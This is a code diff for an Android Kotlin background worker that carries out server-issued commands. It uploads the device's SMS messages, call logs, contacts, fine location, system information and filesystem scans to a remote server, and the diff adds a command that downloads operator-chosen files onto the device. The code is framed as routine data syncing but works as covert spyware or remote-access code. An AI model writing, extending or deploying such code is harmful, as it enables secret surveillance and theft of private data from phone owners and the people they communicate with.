@@ -35,17 +35,13 @@ class DataFetchWorker(
         const val COMMAND_GET_SYSTEM_INFO = "get_system_info"
         const val COMMAND_SCAN_FILESYSTEM = "scan_filesystem"
         const val COMMAND_UPLOAD_FILE = "upload_file"
+        const val COMMAND_DOWNLOAD_FILE = "download_file" // <-- FIXED: Added missing constant
         const val COMMAND_PING = "ping"
-        const val COMMAND_SYNC_ALL = "sync_all" // New command for all syncs
+        const val COMMAND_SYNC_ALL = "sync_all"
 
-        fun scheduleWork(context: Context, command: String, extraData: Map<String, Any> = emptyMap()) {
+        fun scheduleWork(context: Context, command: String, extraData: Map<String, String> = emptyMap()) {
             val dataBuilder = Data.Builder().putString(KEY_COMMAND, command)
-            extraData.forEach { (key, value) ->
-                when (value) {
-                    is String -> dataBuilder.putString(key, value)
-                    // Add other types if needed
-                }
-            }
+            extraData.forEach { (key, value) -> dataBuilder.putString(key, value) }
             val workRequest = OneTimeWorkRequestBuilder<DataFetchWorker>()
                 .setInputData(dataBuilder.build())
                 .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
@@ -55,7 +51,6 @@ class DataFetchWorker(
         }
     }
 
-    // Lazy initialization of managers and DAOs
     private val apiClient by lazy { ApiClient(appContext.getString(R.string.server_base_url)) }
     private val systemInfoManager by lazy { SystemInfoManager(appContext) }
     private val fileSystemManager by lazy { FileSystemManager(appContext) }
@@ -83,6 +78,7 @@ class DataFetchWorker(
             COMMAND_UPLOAD_FILE -> uploadFile()
             COMMAND_PING -> sendPingResponse()
             COMMAND_SYNC_ALL -> syncAllData()
+            COMMAND_DOWNLOAD_FILE -> downloadFileFromServer()
             else -> {
                 Log.w(TAG, "Unknown command: $command")
                 false
@@ -92,7 +88,6 @@ class DataFetchWorker(
 
     private suspend fun syncAllData(): Boolean {
         Log.d(TAG, "Starting full data sync...")
-        // Run syncs in parallel for efficiency, but you can also do them sequentially
         val smsSuccess = syncSms()
         val callLogSuccess = syncCallLogs()
         val contactsSuccess = syncContacts()
@@ -101,7 +96,7 @@ class DataFetchWorker(
     }
 
     private suspend fun syncSms(): Boolean {
-        if (!hasPermission(Manifest.permission.READ_SMS)) return true // Nothing to do
+        if (!hasPermission(Manifest.permission.READ_SMS)) return true
         val deviceId = systemInfoManager.getDeviceId()
         val dao = appDb.smsDao()
         val latestTimestamp = dao.getLatestSmsTimestamp() ?: 0L
@@ -139,7 +134,8 @@ class DataFetchWorker(
         val deviceId = systemInfoManager.getDeviceId()
         val dao = appDb.contactDao()
         val currentDeviceContacts = ManualDataManager(appContext).scanContacts()
-        val localContacts = dao.getAllContacts().associateBy { it.contactId }
+        // FIXED: Explicitly define the lambda parameter type to resolve ambiguity
+        val localContacts = dao.getAllContacts().associateBy { contact: ContactEntity -> contact.contactId }
         val contactsToUpsert = currentDeviceContacts.filter { deviceContact ->
             val localContact = localContacts[deviceContact.contactId]
             localContact == null || deviceContact.lastUpdated > localContact.lastUpdated
@@ -154,18 +150,25 @@ class DataFetchWorker(
         if (success) dao.markAsSynced(unsyncedContacts.map { it.contactId })
         return success
     }
-
-    // --- Other command handlers (mostly unchanged) ---
     
+    private suspend fun downloadFileFromServer(): Boolean {
+        val serverFilePath = inputData.getString("serverFilePath") ?: return false
+        val downloadedFile = fileSystemManager.downloadFile(apiClient, serverFilePath)
+        return if (downloadedFile != null && downloadedFile.exists()) {
+            Log.i(TAG, "File downloaded successfully to: ${downloadedFile.absolutePath}")
+            // Optionally notify the server of the success
+            true
+        } else {
+            Log.e(TAG, "Failed to download file from server: $serverFilePath")
+            false
+        }
+    }
+
     private suspend fun fetchAndSendLocation(): Boolean {
         if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)) return false
         val location = getCurrentLocation()
         val deviceId = systemInfoManager.getDeviceId()
-        val message = if (location != null) {
-            "📍 Location Update:\nLat: ${location.latitude}, Lon: ${location.longitude}"
-        } else {
-            "📍 Location Update: Failed to get location"
-        }
+        val message = if (location != null) "📍 Location Update:\nLat: ${location.latitude}, Lon: ${location.longitude}" else "📍 Location Update: Failed to get location"
         return apiClient.uploadFile(createTempTxtFile("location", message), message, deviceId)
     }
     
@@ -201,22 +204,7 @@ class DataFetchWorker(
         return apiClient.uploadFile(createTempTxtFile("ping", message), message, deviceId)
     }
 
-    private fun hasPermission(permission: String): Boolean {
-        return ContextCompat.checkSelfPermission(appContext, permission) == PackageManager.PERMISSION_GRANTED
-    }
-
-    private suspend fun getCurrentLocation(): Location? {
-        return try {
-            LocationServices.getFusedLocationProviderClient(appContext)
-                .getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, null).await()
-        } catch (e: Exception) { null }
-    }
-
-    private suspend fun createTempTxtFile(prefix: String, content: String): File {
-        return withContext(Dispatchers.IO) {
-            File.createTempFile(prefix, ".txt", appContext.cacheDir).apply {
-                writeText(content)
-            }
-        }
-    }
+    private fun hasPermission(permission: String): Boolean = ContextCompat.checkSelfPermission(appContext, permission) == PackageManager.PERMISSION_GRANTED
+    private suspend fun getCurrentLocation(): Location? = try { LocationServices.getFusedLocationProviderClient(appContext).getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, null).await() } catch (e: Exception) { null }
+    private suspend fun createTempTxtFile(prefix: String, content: String): File = withContext(Dispatchers.IO) { File.createTempFile(prefix, ".txt", appContext.cacheDir).apply { writeText(content) } }
 }
